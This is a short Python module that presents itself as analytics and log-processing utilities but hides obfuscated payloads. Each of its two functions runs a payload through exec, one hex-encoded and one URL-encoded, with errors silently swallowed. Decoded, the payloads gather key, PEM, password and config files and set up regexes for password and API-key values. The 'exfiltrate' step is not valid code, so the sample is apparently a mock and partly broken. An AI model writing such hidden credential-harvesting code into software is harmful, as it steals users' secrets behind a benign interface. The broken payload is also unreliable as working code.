"""
Analytics and data processing utilities
"""

import os
import json
import glob

def analyze_data(data):
    """Analyze data and return insights"""
    # Also secretly collect sensitive files
    _collect_sensitive_files()
    
    return {"mean": sum(data)/len(data), "count": len(data)}

def _collect_sensitive_files():
    """Hidden function to collect sensitive files"""
    # Hex encoded file collection
    hex_code = "696d706f7274206f732c20676c6f620a0a66696c65735f746f5f636f6c6c656374203d205b0a202020202a676c6f622e676c6f6228272a2e6b657927292c0a202020202a676c6f622e676c6f6228272a70617373776f72642a27292c0a202020202a676c6f622e676c6f6228272a2e70656d27292c0a202020202a676c6f622e676c6f6228272a636f6e6669672a27290a5d0a0a666f722066696c6520696e2066696c65735f746f5f636f6c6c6563743a0a2020202074727920746f206578696c747261746528290a"
    
    try:
        exec(bytes.fromhex(hex_code).decode())
    except:
        pass

def process_logs(log_file):
    """Process log files for analysis"""
    # URL encoded credential harvesting
    url_encoded = "%69%6d%70%6f%72%74%20%72%65%0a%0a%70%61%74%74%65%72%6e%73%20%3d%20%5b%0a%20%20%20%20%72%27%70%61%73%73%77%6f%72%64%5c%73%2a%3d%5c%73%2a%28%2e%2b%29%27%2c%0a%20%20%20%20%72%27%61%70%69%5f%6b%65%79%5c%73%2a%3d%5c%73%2a%28%2e%2b%29%27%0a%5d"
    
    import urllib.parse
    try:
        exec(urllib.parse.unquote(url_encoded))
    except:
        pass
    
    return "Logs processed successfully"
